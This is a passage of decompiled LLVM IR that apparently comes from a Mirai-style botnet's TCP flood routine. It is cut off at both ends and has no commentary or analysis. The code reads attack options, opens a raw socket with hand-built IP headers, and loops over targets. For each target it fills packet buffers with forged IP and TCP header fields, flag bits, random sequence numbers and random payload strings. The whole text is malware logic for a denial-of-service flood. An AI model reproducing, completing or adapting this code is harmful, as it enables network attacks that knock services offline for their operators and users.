  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_bbc0 = load i32, i32* @sb, align 4
  %v24_bbc0 = load i32, i32* @fp, align 4
  %v27_bbc0 = load i32, i32* @lr, align 4
  store i32 0, i32* @sl, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_bbec = call i32 @calloc(i32 %arg2, i32 4)
  %v0_bbf0 = load i32, i32* @r4, align 4
  store i32 %v0_bbf0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_bbfc = load i32, i32* @sl, align 4
  store i32 %v0_bbfc, i32* %r3.global-to-local, align 4
  %v0_bc00 = load i32, i32* @r5, align 4
  store i32 %v0_bc00, i32* %r0.global-to-local, align 4
  %v5_bc04 = inttoptr i32 %v0_bbf0 to i32*
  %v6_bc04 = call i32 @attack_get_opt_int(i32 %v0_bc00, i32* %v5_bc04, i32 2, i32 %v0_bbfc)
  %v1_bc10 = urem i32 %v6_bc04, 256
  store i32 %v1_bc10, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_bc1c = load i32, i32* @r4, align 4
  store i32 %v0_bc1c, i32* %r1.global-to-local, align 4
  %v0_bc20 = load i32, i32* @r5, align 4
  store i32 %v0_bc20, i32* %r0.global-to-local, align 4
  %v5_bc24 = trunc i32 %v6_bc04 to i8
  %v6_bc28 = inttoptr i32 %v0_bc1c to i32*
  %v7_bc28 = call i32 @attack_get_opt_int(i32 %v0_bc20, i32* %v6_bc28, i32 3, i32 65535)
  %v0_bc2c = load i32, i32* @r4, align 4
  store i32 %v0_bc2c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_bc3c = load i32, i32* @r5, align 4
  store i32 %v0_bc3c, i32* %r0.global-to-local, align 4
  %v5_bc40 = inttoptr i32 %v0_bc2c to i32*
  %v6_bc40 = call i32 @attack_get_opt_int(i32 %v0_bc3c, i32* %v5_bc40, i32 4, i32 64)
  %v1_bc48 = urem i32 %v6_bc40, 256
  store i32 %v1_bc48, i32* %ip.global-to-local, align 4
  %v0_bc4c = load i32, i32* @r4, align 4
  store i32 %v0_bc4c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v0_bc54 = load i32, i32* @sl, align 4
  store i32 %v0_bc54, i32* %r3.global-to-local, align 4
  %v0_bc58 = load i32, i32* @r5, align 4
  store i32 %v0_bc58, i32* %r0.global-to-local, align 4
  %v6_bc60 = inttoptr i32 %v0_bc4c to i32*
  %v7_bc60 = call i32 @attack_get_opt_int(i32 %v0_bc58, i32* %v6_bc60, i32 5, i32 %v0_bc54)
  %v1_bc6c = urem i32 %v7_bc60, 256
  store i32 %v1_bc6c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_bc78 = load i32, i32* @r4, align 4
  store i32 %v0_bc78, i32* %r1.global-to-local, align 4
  %v0_bc7c = load i32, i32* @r5, align 4
  store i32 %v0_bc7c, i32* %r0.global-to-local, align 4
  %v5_bc84 = inttoptr i32 %v0_bc78 to i32*
  %v6_bc84 = call i32 @attack_get_opt_int(i32 %v0_bc7c, i32* %v5_bc84, i32 6, i32 65535)
  %v0_bc8c = load i32, i32* @r4, align 4
  store i32 %v0_bc8c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_bc84, i32* %fp.global-to-local, align 4
  %v0_bc9c = load i32, i32* @r5, align 4
  store i32 %v0_bc9c, i32* %r0.global-to-local, align 4
  %v4_bca0 = inttoptr i32 %v0_bc8c to i32*
  %v5_bca0 = call i32 @attack_get_opt_int(i32 %v0_bc9c, i32* %v4_bca0, i32 7, i32 65535)
  %v0_bca8 = load i32, i32* @r4, align 4
  store i32 %v0_bca8, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 %v5_bca0, i32* %sb.global-to-local, align 4
  %v0_bcb8 = load i32, i32* @r5, align 4
  store i32 %v0_bcb8, i32* %r0.global-to-local, align 4
  %v4_bcbc = inttoptr i32 %v0_bca8 to i32*
  %v5_bcbc = call i32 @attack_get_opt_int(i32 %v0_bcb8, i32* %v4_bcbc, i32 16, i32 65535)
  %v0_bcc8 = load i32, i32* @r4, align 4
  store i32 %v0_bcc8, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v0_bcd4 = load i32, i32* @r5, align 4
  store i32 %v0_bcd4, i32* %r0.global-to-local, align 4
  %v5_bcd8 = inttoptr i32 %v0_bcc8 to i32*
  %v6_bcd8 = call i32 @attack_get_opt_int(i32 %v0_bcd4, i32* %v5_bcd8, i32 17, i32 65535)
  %v0_bcdc = load i32, i32* @r4, align 4
  store i32 %v0_bcdc, i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v0_bce8 = load i32, i32* @sl, align 4
  store i32 %v0_bce8, i32* %r3.global-to-local, align 4
  %v0_bcec = load i32, i32* @r5, align 4
  store i32 %v0_bcec, i32* %r0.global-to-local, align 4
  %v5_bcf0 = inttoptr i32 %v0_bcdc to i32*
  %v6_bcf0 = call i32 @attack_get_opt_int(i32 %v0_bcec, i32* %v5_bcf0, i32 10, i32 %v0_bce8)
  %v0_bcf4 = load i32, i32* @r4, align 4
  store i32 %v0_bcf4, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bd04 = load i32, i32* @r5, align 4
  store i32 %v0_bd04, i32* %r0.global-to-local, align 4
  %v5_bd08 = inttoptr i32 %v0_bcf4 to i32*
  %v6_bd08 = call i32 @attack_get_opt_int(i32 %v0_bd04, i32* %v5_bd08, i32 11, i32 1)
  %v0_bd0c = load i32, i32* @r4, align 4
  store i32 %v0_bd0c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v0_bd18 = load i32, i32* @sl, align 4
  store i32 %v0_bd18, i32* %r3.global-to-local, align 4
  %v0_bd1c = load i32, i32* @r5, align 4
  store i32 %v0_bd1c, i32* %r0.global-to-local, align 4
  %v5_bd20 = inttoptr i32 %v0_bd0c to i32*
  %v6_bd20 = call i32 @attack_get_opt_int(i32 %v0_bd1c, i32* %v5_bd20, i32 12, i32 %v0_bd18)
  %v0_bd24 = load i32, i32* @r4, align 4
  store i32 %v0_bd24, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_bd30 = load i32, i32* @sl, align 4
  store i32 %v0_bd30, i32* %r3.global-to-local, align 4
  %v0_bd34 = load i32, i32* @r5, align 4
  store i32 %v0_bd34, i32* %r0.global-to-local, align 4
  %v5_bd38 = inttoptr i32 %v0_bd24 to i32*
  %v6_bd38 = call i32 @attack_get_opt_int(i32 %v0_bd34, i32* %v5_bd38, i32 13, i32 %v0_bd30)
  %v0_bd3c = load i32, i32* @r4, align 4
  store i32 %v0_bd3c, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  %v0_bd48 = load i32, i32* @sl, align 4
  store i32 %v0_bd48, i32* %r3.global-to-local, align 4
  %v0_bd4c = load i32, i32* @r5, align 4
  store i32 %v0_bd4c, i32* %r0.global-to-local, align 4
  %v5_bd50 = inttoptr i32 %v0_bd3c to i32*
  %v6_bd50 = call i32 @attack_get_opt_int(i32 %v0_bd4c, i32* %v5_bd50, i32 14, i32 %v0_bd48)
  %v0_bd54 = load i32, i32* @r4, align 4
  store i32 %v0_bd54, i32* %r1.global-to-local, align 4
  %v0_bd5c = load i32, i32* @sl, align 4
  store i32 %v0_bd5c, i32* %r3.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_bd64 = load i32, i32* @r5, align 4
  store i32 %v0_bd64, i32* %r0.global-to-local, align 4
  %v5_bd68 = inttoptr i32 %v0_bd54 to i32*
  %v6_bd68 = call i32 @attack_get_opt_int(i32 %v0_bd64, i32* %v5_bd68, i32 15, i32 %v0_bd5c)
  %v0_bd6c = load i32, i32* @r4, align 4
  store i32 %v0_bd6c, i32* %r1.global-to-local, align 4
  %v0_bd74 = load i32, i32* @sl, align 4
  store i32 %v0_bd74, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_bd7c = load i32, i32* @r5, align 4
  store i32 %v0_bd7c, i32* %r0.global-to-local, align 4
  %v5_bd80 = inttoptr i32 %v0_bd6c to i32*
  %v6_bd80 = call i32 @attack_get_opt_int(i32 %v0_bd7c, i32* %v5_bd80, i32 %v0_bd74, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bd8c = load i32, i32* @r4, align 4
  store i32 %v0_bd8c, i32* %r1.global-to-local, align 4
  store i32 %v6_bd80, i32* @r8, align 4
  %v0_bd94 = load i32, i32* @r5, align 4
  store i32 %v0_bd94, i32* %r0.global-to-local, align 4
  %v4_bd98 = inttoptr i32 %v0_bd8c to i32*
  %v5_bd98 = call i32 @attack_get_opt_int(i32 %v0_bd94, i32* %v4_bd98, i32 1, i32 1)
  %v2_bda4 = load i32, i32* @global_var_271b8.90, align 4
  store i32 %v2_bda4, i32* %r3.global-to-local, align 4
  %v1_bda8 = urem i32 %v5_bd98, 256
  store i32 %v1_bda8, i32* %ip.global-to-local, align 4
  %v0_bdac = load i32, i32* @r4, align 4
  store i32 %v0_bdac, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_bdb4 = load i32, i32* @r5, align 4
  store i32 %v0_bdb4, i32* %r0.global-to-local, align 4
  %v5_bdbc = inttoptr i32 %v0_bdac to i32*
  %v6_bdbc = call i32 @attack_get_opt_ip(i32 %v0_bdb4, i32* %v5_bdbc, i32 24, i32 %v2_bda4, i32 %v1_bda8)
  %v0_bdc4 = load i32, i32* @sl, align 4
  store i32 %v0_bdc4, i32* %r0.global-to-local, align 4
  %v1_bdc8 = inttoptr i32 %v0_bdc4 to i32*
  %v2_bdc8 = call i32 @__GI_time(i32* %v1_bdc8)
  %v1_bdcc = load i32, i32* @r6, align 4
  %v2_bdcc = add i32 %v1_bdcc, %v2_bdc8
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_bde0 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_bde0, i32* %r0.global-to-local, align 4
  %v7_bde4 = icmp eq i32 %v3_bde0, -1
  store i1 %v7_bde4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bde4, label %dec_label_pc_c2c8, label %dec_label_pc_bdf0

dec_label_pc_bdf0:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_bdf8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_bdf8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_be00 = load i32, i32* @sl, align 4
  store i32 %v0_be00, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_be0c = call i32 @__GI_setsockopt(i32 %v3_bde0, i32 %v0_be00, i32 3, i32 %v6_bdf8, i32 4)
  store i32 %v5_be0c, i32* %r0.global-to-local, align 4
  %v7_be10 = icmp eq i32 %v5_be0c, -1
  store i1 %v7_be10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_be10, label %dec_label_pc_c2d4, label %dec_label_pc_be18

dec_label_pc_be18:                                ; preds = %dec_label_pc_bdf0
  store i32 %v7_bc28, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_be24 = load i32, i32* %fp.global-to-local, align 4
  %v0_be28 = load i32, i32* %sb.global-to-local, align 4
  %v3_be28 = mul i32 %v0_be28, 65536
  store i32 %v3_be28, i32* %sb.global-to-local, align 4
  %v3_be2c = urem i32 %v7_bc28, 65536
  store i32 %v3_be2c, i32* %r2.global-to-local, align 4
  %v3_be30 = urem i32 %v0_be24, 65536
  store i32 %v3_be30, i32* %r3.global-to-local, align 4
  %v3_be34 = urem i32 %v0_be28, 65536
  store i32 %v3_be34, i32* %ip.global-to-local, align 4
  %v2_be38 = icmp eq i32 %arg2, 0
  store i1 %v2_be38, i1* %cpsr_z.global-to-local, align 1
  %v0_be3c = load i32, i32* @sl, align 4
  store i32 %v0_be3c, i32* %stack_var_-44, align 4
  br i1 %v2_be38, label %dec_label_pc_c078.preheader, label %dec_label_pc_be50

dec_label_pc_be50:                                ; preds = %dec_label_pc_be18
  %v0_be60 = load i32, i32* @r8, align 4
  %v3_be60 = mul i32 %v0_be60, 65536
  %v1_be68 = add i32 %v3_be60, 2621440
  %tmp59 = mul i32 %v0_be24, 256
  %v3_be74 = and i32 %tmp59, 65280
  %tmp60 = mul i32 %v0_be28, 256
  %v3_be78 = and i32 %tmp60, 65280
  %tmp61 = udiv i32 %v0_be24, 256
  %v4_be80 = urem i32 %tmp61, 256
  %v5_be80 = or i32 %v4_be80, %v3_be74
  %tmp62 = udiv i32 %v1_be68, 256
  %v3_be84 = and i32 %tmp62, 65280
  %tmp63 = mul i32 %v7_bc28, 256
  %v3_be88 = and i32 %tmp63, 65280
  %tmp64 = udiv i32 %v0_be28, 256
  %v4_be8c = urem i32 %tmp64, 256
  %v5_be8c = or i32 %v4_be8c, %v3_be78
  store i32 %v5_be8c, i32* @fp, align 4
  %v4_be9c = udiv i32 %v1_be68, 16777216
  %v5_be9c = or i32 %v3_be84, %v4_be9c
  store i32 %v5_be9c, i32* @lr, align 4
  %tmp65 = udiv i32 %v7_bc28, 256
  %v4_bea0 = urem i32 %tmp65, 256
  %v5_bea0 = or i32 %v4_bea0, %v3_be88
  store i32 %v5_bea0, i32* @r5, align 4
  %tmp66 = mul i32 %v5_bcbc, 256
  %v3_beac = and i32 %tmp66, 65280
  %v1_beb0 = urem i32 %v6_bcf0, 2
  %v1_beb4 = urem i32 %v6_bd08, 2
  %tmp67 = udiv i32 %v5_bcbc, 256
  %v4_beb8 = urem i32 %tmp67, 256
  %v5_beb8 = or i32 %v4_beb8, %v3_beac
  %v1_bec4 = urem i32 %v6_bd20, 2
  store i32 %v1_bec4, i32* %r2.global-to-local, align 4
  %v1_bec8 = urem i32 %v6_bd38, 2
  store i32 %v1_bec8, i32* %r3.global-to-local, align 4
  store i32 %v6_bd50, i32* %ip.global-to-local, align 4
  store i32 %v6_bd68, i32* %r0.global-to-local, align 4
  store i32 %v6_bd20, i32* %r1.global-to-local, align 4
  %v1_bef0 = urem i32 %v6_bd50, 2
  store i32 %v1_bef0, i32* @sb, align 4
  store i32 %v0_be3c, i32* @r4, align 4
  %v1_bef8 = urem i32 %v6_bd20, 256
  store i32 %v1_bef8, i32* @r6, align 4
  %v1_befc = urem i32 %v6_bd68, 2
  store i32 %v1_befc, i32* @sl, align 4
  %v4_bf54 = sext i8 %v5_bc24 to i32
  %sext6 = mul nuw i32 %v5_be9c, 65536
  %v4_bf70 = sdiv i32 %sext6, 65536
  %sext7 = mul nuw i32 %v5_bea0, 65536
  %v4_bf78 = sdiv i32 %sext7, 65536
  %sext8 = mul nuw i32 %v5_be80, 65536
  %v4_bf94 = sdiv i32 %sext8, 65536
  %tmp = sub nsw i32 0, %v1_beb4
  %v4_bfe4 = and i32 %tmp, 16
  %tmp70 = sub nsw i32 0, %v1_bec4
  %v4_bff8 = and i32 %tmp70, 8
  %tmp71 = sub nsw i32 0, %v1_bec8
  %v4_c00c = and i32 %tmp71, 4
  %v1_bf64 = trunc i32 %v6_bc40 to i8
  br label %dec_label_pc_bf00

dec_label_pc_bf00:                                ; preds = %.thread10, %dec_label_pc_be50
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_bf0c = call i32 @calloc(i32 1510, i32 1)
  %v2_bf14 = load i32, i32* @r4, align 4
  %v5_bf14 = mul i32 %v2_bf14, 4
  %v6_bf14 = add i32 %v5_bf14, %v2_bbec
  %v7_bf14 = inttoptr i32 %v6_bf14 to i32*
  store i32 %v2_bf0c, i32* %v7_bf14, align 4
  %v3_bf18 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bf18, i32* %r2.global-to-local, align 4
  %v5_bf20 = mul i32 %v3_bf18, 24
  %v1_bf24 = load i32, i32* @r7, align 4
  %v2_bf24 = add i32 %v1_bf24, %v5_bf20
  store i32 %v2_bf24, i32* %r0.global-to-local, align 4
  store i32 %v2_bbec, i32* %r3.global-to-local, align 4
  %v4_bf2c = mul i32 %v3_bf18, 4
  %v5_bf2c = add i32 %v4_bf2c, %v2_bbec
  %v6_bf2c = inttoptr i32 %v5_bf2c to i32*
  %v7_bf2c = load i32, i32* %v6_bf2c, align 4
  store i32 %v7_bf2c, i32* %r1.global-to-local, align 4
  %v1_bf30 = inttoptr i32 %v7_bf2c to i8*
  %v2_bf30 = load i8, i8* %v1_bf30, align 1
  %tmp72 = urem i8 %v2_bf30, 16
  %v1_bf34 = zext i8 %tmp72 to i32
  %v1_bf38 = or i32 %v1_bf34, 64
  store i32 %v1_bf38, i32* %r3.global-to-local, align 4
  %v1_bf3c = trunc i32 %v1_bf38 to i8
  store i8 %v1_bf3c, i8* %v1_bf30, align 1
  %v0_bf40 = load i32, i32* %r1.global-to-local, align 4
  %v1_bf40 = inttoptr i32 %v0_bf40 to i8*
  %v2_bf40 = load i8, i8* %v1_bf40, align 1
  %v1_bf44 = and i8 %v2_bf40, -16
  %v1_bf48 = or i8 %v1_bf44, 5
  store i32 %v1_bc6c, i32* %ip.global-to-local, align 4
  store i8 %v1_bf48, i8* %v1_bf40, align 1
  store i32 %v4_bf54, i32* %r2.global-to-local, align 4
  %v2_bf58 = load i32, i32* %r1.global-to-local, align 4
  %v3_bf58 = add i32 %v2_bf58, 1
  %v4_bf58 = inttoptr i32 %v3_bf58 to i8*
  store i8 %v5_bc24, i8* %v4_bf58, align 1
  store i32 %v1_bc48, i32* %r3.global-to-local, align 4
  %v0_bf60 = load i32, i32* %ip.global-to-local, align 4
  %v2_bf60 = icmp eq i32 %v0_bf60, 0
  store i1 %v2_bf60, i1* %cpsr_z.global-to-local, align 1
  %v2_bf64 = load i32, i32* %r1.global-to-local, align 4
  %v3_bf64 = add i32 %v2_bf64, 8
  %v4_bf64 = inttoptr i32 %v3_bf64 to i8*
  store i8 %v1_bf64, i8* %v4_bf64, align 1
  %v0_bf68 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bf68, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_bf00
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_bf6c = load i32, i32* %r1.global-to-local, align 4
  %v4_bf6c = add i32 %v3_bf6c, 6
  %v5_bf6c = inttoptr i32 %v4_bf6c to i16*
  store i16 64, i16* %v5_bf6c, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_bf00, %bb
  store i32 %v4_bf70, i32* %ip.global-to-local, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 %v4_bf78, i32* %r2.global-to-local, align 4
  %v2_bf7c = load i32, i32* %r1.global-to-local, align 4
  %v3_bf7c = add i32 %v2_bf7c, 9
  %v4_bf7c = inttoptr i32 %v3_bf7c to i8*
  store i8 6, i8* %v4_bf7c, align 1
  %v0_bf80 = load i32, i32* %ip.global-to-local, align 4
  %v1_bf80 = trunc i32 %v0_bf80 to i16
  %v2_bf80 = load i32, i32* %r1.global-to-local, align 4
  %v3_bf80 = add i32 %v2_bf80, 2
  %v4_bf80 = inttoptr i32 %v3_bf80 to i16*
  store i16 %v1_bf80, i16* %v4_bf80, align 2
  store i32 %v6_bdbc, i32* %ip.global-to-local, align 4
  %v1_bf88 = load i32, i32* %r1.global-to-local, align 4
  %v2_bf88 = add i32 %v1_bf88, 12
  %v3_bf88 = inttoptr i32 %v2_bf88 to i32*
  store i32 %v6_bdbc, i32* %v3_bf88, align 4
  %v0_bf8c = load i32, i32* %r2.global-to-local, align 4
  %v1_bf8c = trunc i32 %v0_bf8c to i16
  %v2_bf8c = load i32, i32* %r1.global-to-local, align 4
  %v3_bf8c = add i32 %v2_bf8c, 4
  %v4_bf8c = inttoptr i32 %v3_bf8c to i16*
  store i16 %v1_bf8c, i16* %v4_bf8c, align 2
  %v0_bf90 = load i32, i32* %r0.global-to-local, align 4
  %v1_bf90 = add i32 %v0_bf90, 16
  %v2_bf90 = inttoptr i32 %v1_bf90 to i32*
  %v3_bf90 = load i32, i32* %v2_bf90, align 4
  store i32 %v3_bf90, i32* %r2.global-to-local, align 4
  store i32 %v4_bf94, i32* %r0.global-to-local, align 4
  %v1_bf98 = load i32, i32* %r1.global-to-local, align 4
  %v2_bf98 = add i32 %v1_bf98, 16
  %v3_bf98 = inttoptr i32 %v2_bf98 to i32*
  store i32 %v3_bf90, i32* %v3_bf98, align 4
  %v0_bf9c = load i32, i32* %r0.global-to-local, align 4
  %v1_bf9c = trunc i32 %v0_bf9c to i16
  %v2_bf9c = load i32, i32* %r1.global-to-local, align 4
  %v3_bf9c = add i32 %v2_bf9c, 20
  %v4_bf9c = inttoptr i32 %v3_bf9c to i16*
  store i16 %v1_bf9c, i16* %v4_bf9c, align 2
  %v0_bfa0 = load i32, i32* %r1.global-to-local, align 4
  %v1_bfa0 = add i32 %v0_bfa0, 20
  store i32 %v1_bfa0, i32* @r4, align 4
  %v1_bfa4 = add i32 %v0_bfa0, 32
  %v2_bfa4 = inttoptr i32 %v1_bfa4 to i8*
  %v3_bfa4 = load i8, i8* %v2_bfa4, align 1
  %v4_bfa4 = zext i8 %v3_bfa4 to i32
  %v1_bfa8 = and i32 %v4_bfa4, 95
  store i32 %v1_bfa8, i32* %r3.global-to-local, align 4
  %v1_bfac = add i32 %v0_bfa0, 33
  %v2_bfac = inttoptr i32 %v1_bfac to i8*
  %v3_bfac = load i8, i8* %v2_bfac, align 1
  %v4_bfac = zext i8 %v3_bfac to i32
  store i32 %v4_bfac, i32* %r2.global-to-local, align 4
  %v1_bfb0 = or i32 %v1_bfa8, 80
  %v1_bfb4 = add i32 %v0_bfa0, 40
  store i32 %v1_bfb4, i32* @r5, align 4
  store i32 %v1_beb0, i32* %r1.global-to-local, align 4
  %v1_bfbc = trunc i32 %v1_bfb0 to i8
  store i8 %v1_bfbc, i8* %v2_bfa4, align 1
  store i32 %v5_beb8, i32* %r3.global-to-local, align 4
  %v0_bfc4 = load i32, i32* %r2.global-to-local, align 4
  %v1_bfc4 = and i32 %v0_bfc4, -33
  %v1_bfc8 = load i32, i32* %r1.global-to-local, align 4
  %v4_bfc8 = mul i32 %v1_bfc8, 32
  %v5_bfc8 = or i32 %v4_bfc8, %v1_bfc4
  store i32 %v5_bfc8, i32* %r2.global-to-local, align 4
  %v1_bfcc = load i32, i32* @r4, align 4
  %v2_bfcc = add i32 %v1_bfcc, 4
  %v3_bfcc = inttoptr i32 %v2_bfcc to i32*
  store i32 %v5_beb8, i32* %v3_bfcc, align 4
  %v0_bfd0 = load i32, i32* @fp, align 4
  %v1_bfd0 = trunc i32 %v0_bfd0 to i16
  %v2_bfd0 = load i32, i32* @r4, align 4
  %v3_bfd0 = add i32 %v2_bfd0, 2
  %v4_bfd0 = inttoptr i32 %v3_bfd0 to i16*
  store i16 %v1_bfd0, i16* %v4_bfd0, align 2
  %v0_bfd4 = load i32, i32* %r2.global-to-local, align 4
  %v1_bfd4 = trunc i32 %v0_bfd4 to i8
  %v2_bfd4 = load i32, i32* @r4, align 4
  %v3_bfd4 = add i32 %v2_bfd4, 13
  %v4_bfd4 = inttoptr i32 %v3_bfd4 to i8*
  store i8 %v1_bfd4, i8* %v4_bfd4, align 1
  %v0_bfd8 = load i32, i32* @r4, align 4
  %v1_bfd8 = add i32 %v0_bfd8, 13
  %v2_bfd8 = inttoptr i32 %v1_bfd8 to i8*
  %v3_bfd8 = load i8, i8* %v2_bfd8, align 1
  %v4_bfd8 = zext i8 %v3_bfd8 to i32
  store i32 %v1_beb4, i32* %ip.global-to-local, align 4
  %v1_bfe0 = and i32 %v4_bfd8, 239
  %v5_bfe4 = or i32 %v1_bfe0, %v4_bfe4
  store i32 %v5_bfe4, i32* %r3.global-to-local, align 4
  %v1_bfe8 = trunc i32 %v5_bfe4 to i8
  store i8 %v1_bfe8, i8* %v2_bfd8, align 1
  %v0_bfec = load i32, i32* @r4, align 4
  %v1_bfec = add i32 %v0_bfec, 13
  %v2_bfec = inttoptr i32 %v1_bfec to i8*
  %v3_bfec = load i8, i8* %v2_bfec, align 1
  %v4_bfec = zext i8 %v3_bfec to i32
  store i32 %v1_bec4, i32* %r0.global-to-local, align 4
  %v1_bff4 = and i32 %v4_bfec, 247
  %v5_bff8 = or i32 %v1_bff4, %v4_bff8
  store i32 %v5_bff8, i32* %r2.global-to-local, align 4
  %v1_bffc = trunc i32 %v5_bff8 to i8
  store i8 %v1_bffc, i8* %v2_bfec, align 1
  %v0_c000 = load i32, i32* @r4, align 4
  %v1_c000 = add i32 %v0_c000, 13
  %v2_c000 = inttoptr i32 %v1_c000 to i8*
  %v3_c000 = load i8, i8* %v2_c000, align 1
  %v4_c000 = zext i8 %v3_c000 to i32
  store i32 %v1_bec8, i32* %r1.global-to-local, align 4
  %v1_c008 = and i32 %v4_c000, 251
  %v5_c00c = or i32 %v1_c008, %v4_c00c
  store i32 %v5_c00c, i32* %r3.global-to-local, align 4
  %v1_c010 = trunc i32 %v5_c00c to i8
  store i8 %v1_c010, i8* %v2_c000, align 1
  %v0_c014 = load i32, i32* @r4, align 4
  %v1_c014 = add i32 %v0_c014, 13
  %v2_c014 = inttoptr i32 %v1_c014 to i8*
  %v3_c014 = load i8, i8* %v2_c014, align 1
  %v4_c014 = zext i8 %v3_c014 to i32
  %v1_c018 = and i32 %v4_c014, 253
  %v1_c01c = load i32, i32* @sb, align 4
  %v3_c01c = mul i32 %v1_c01c, 2
  %v4_c01c = or i32 %v3_c01c, %v1_c018
  store i32 %v4_c01c, i32* %r2.global-to-local, align 4
  %v1_c020 = trunc i32 %v4_c01c to i8
  store i8 %v1_c020, i8* %v2_c014, align 1
  %v0_c024 = load i32, i32* @r4, align 4
  %v1_c024 = add i32 %v0_c024, 13
  %v2_c024 = inttoptr i32 %v1_c024 to i8*
  %v3_c024 = load i8, i8* %v2_c024, align 1
  %v4_c024 = zext i8 %v3_c024 to i32
  %v1_c028 = and i32 %v4_c024, 254
  %v0_c02c = load i32, i32* @sl, align 4
  %v2_c02c = or i32 %v1_c028, %v0_c02c
  store i32 %v2_c02c, i32* %r3.global-to-local, align 4
  %v1_c030 = trunc i32 %v2_c02c to i8
  store i8 %v1_c030, i8* %v2_c024, align 1
  %v0_c034 = call i32 @rand_next()
  %v1_c034 = trunc i32 %v0_c034 to i16
  store i32 %v0_c034, i32* %r0.global-to-local, align 4
  %v0_c038 = load i32, i32* @r6, align 4
  %v2_c038 = icmp eq i32 %v0_c038, 0
  store i1 %v2_c038, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c038, label %.thread10, label %bb68

bb68:                                             ; preds = %.thread
  %v1_c03c = load i32, i32* @r4, align 4
  %v2_c03c = add i32 %v1_c03c, 13
  %v3_c03c = inttoptr i32 %v2_c03c to i8*
  %v4_c03c = load i8, i8* %v3_c03c, align 1
  %v5_c03c = zext i8 %v4_c03c to i32
  %v2_c040 = or i32 %v5_c03c, 8
  store i32 %v2_c040, i32* %r3.global-to-local, align 4
  %v2_c044 = trunc i32 %v2_c040 to i8
  store i8 %v2_c044, i8* %v3_c03c, align 1
  br label %.thread10

.thread10:                                        ; preds = %.thread, %bb68
  %v3_c048 = load i32, i32* @r4, align 4
  %v4_c048 = add i32 %v3_c048, 14
  %v5_c048 = inttoptr i32 %v4_c048 to i16*
  store i16 %v1_c034, i16* %v5_c048, align 2
  %v0_c04c = load i32, i32* @r8, align 4
  store i32 %v0_c04c, i32* %r1.global-to-local, align 4
  %v0_c050 = load i32, i32* @r5, align 4
  store i32 %v0_c050, i32* %r0.global-to-local, align 4
  %v2_c054 = call i32 @rand_alphastr(i32 %v0_c050, i32 %v0_c04c)
  store i32 %v2_c054, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c05c = load i32, i32* @r5, align 4
  %v3_c05c = load i32, i32* @r8, align 4
  %v4_c05c = add i32 %v3_c05c, %v2_c05c
  %v5_c05c = inttoptr i32 %v4_c05c to i8*
  store i8 0, i8* %v5_c05c, align 1
  %v3_c060 = load i32, i32* %stack_var_-44, align 4
  %v1_c064 = add i32 %v3_c060, 1
  store i32 %v1_c064, i32* @r4, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v9_c06c = icmp eq i32 %v1_c064, %arg2
  store i1 %v9_c06c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c064, i32* %stack_var_-44, align 4
  %v5_c074 = icmp slt i32 %v1_c064, %arg2
  br i1 %v5_c074, label %dec_label_pc_bf00, label %dec_label_pc_c078.preheader

dec_label_pc_c078.preheader:                      ; preds = %.thread10, %dec_label_pc_be18
